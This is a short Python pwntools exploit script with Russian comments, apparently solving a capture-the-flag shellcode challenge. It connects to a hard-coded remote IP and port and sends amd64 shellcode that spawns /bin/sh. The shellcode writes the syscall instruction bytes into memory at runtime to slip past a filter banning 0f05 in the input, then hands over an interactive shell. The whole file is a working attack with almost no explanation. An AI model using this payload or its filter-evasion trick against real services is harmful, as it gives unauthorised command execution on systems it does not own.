from pwn import *
context.arch = 'amd64'

io = remote("109.233.56.90", 11614)   # порт поправь под этот таск

src = """
lea r15, [rip+gadget]
mov byte ptr [r15], 0x0f
mov byte ptr [r15+1], 0x05
mov byte ptr [r15+2], 0xc3
xor eax, eax
push rax
mov rbx, 0x68732f6e69622f
push rbx
mov rdi, rsp
xor esi, esi
xor edx, edx
mov eax, 59
call r15
gadget:
.byte 0,0,0
"""

payload = asm(src)
assert b"\x0f\x05" not in payload, "0f05 просочился во вход!"   # страховка
io.sendafter(b"Gimme shellcode:", payload)
io.interactive()
